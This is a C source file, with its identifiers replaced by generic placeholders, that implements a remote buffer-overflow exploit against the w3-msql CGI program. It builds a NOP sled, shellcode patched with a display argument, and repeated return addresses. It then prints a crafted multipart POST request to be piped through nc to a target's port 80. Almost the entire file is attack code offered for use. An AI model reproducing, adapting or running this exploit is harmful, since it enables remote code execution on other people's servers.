#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 long ADDR ; 
 int ADDR_TIMES ; 
 int BUFSIZE ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (char*) ; 
 char* FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC4 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 char* shellcode ; 
 int FUNC7 (char*) ; 

int FUNC8 (int argc, char *argv[]) {
 
char *buf, *ptr;
long addr=ADDR;
int aux;

 if (argc<3){
   FUNC6("Usage: %s target display | nc target 80 \n",argv[0]);
   FUNC0(-1);
   }

 if ((buf=FUNC2(BUFSIZE))==NULL) {
       FUNC5("malloc()");
       FUNC0(-1);
      } 

 shellcode[44]=(char)FUNC7(argv[2])+43;
   
 ptr=(char *)buf;
 FUNC4(ptr,NOP,BUFSIZE-FUNC7(argv[2])-FUNC7(shellcode)-ADDR_TIMES*4);
 ptr+=BUFSIZE-FUNC7(shellcode)-FUNC7(argv[2])-ADDR_TIMES*4;
 FUNC3(ptr,shellcode,FUNC7(shellcode));
 ptr+=FUNC7(shellcode);  
 FUNC3(ptr,argv[2],FUNC7(argv[2]));
 ptr+=FUNC7(argv[2]);

 for (aux=0;aux<ADDR_TIMES;aux++) {
   ptr[0] = (addr & 0x000000ff);
   ptr[1] = (addr & 0x0000ff00) >> 8;
   ptr[2] = (addr & 0x00ff0000) >> 16;
   ptr[3] = (addr & 0xff000000) >> 24;
   ptr+=4;
   }
 
 FUNC6("POST /cgi-bin/w3-msql/index.html HTTP/1.0\n");
 FUNC6("Connection: Keep-Alive\n");
 FUNC6("User-Agent: Mozilla/4.60 [en] (X11; I; Linux 2.0.38 i686\n");
 FUNC6("Host: %s\n",argv[1]);  
 FUNC6("Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg\n");
 FUNC6("Accept-Encoding: gzip\n");   
 FUNC6("Accept-Language: en\n");
 FUNC6("Accept-Charset: iso-8859-1,*,utf-8\n");
 FUNC6("Content-type: multipart/form-data\n");
 FUNC6("Content-length: %i\n\n",BUFSIZE);
 
 FUNC6("%s \n\n\n",buf);
 
 FUNC1(buf);
 
}